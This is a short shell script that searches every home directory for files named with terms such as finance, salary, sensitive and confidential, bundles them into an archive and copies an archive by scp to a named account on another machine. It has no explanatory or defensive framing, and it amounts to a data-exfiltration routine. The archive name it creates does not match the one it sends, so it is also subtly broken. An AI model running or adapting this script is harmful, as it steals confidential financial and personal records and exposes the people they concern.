file=$( find /home/  \( -name "*finance*" -o -name "*salary*" -o -name "*sensitive*" -o -name "*confidential*" \) )
tar czvf a.tar $file
scp sensitive.tar basanta@172.22.168.180:/home/basanta/Desktop/
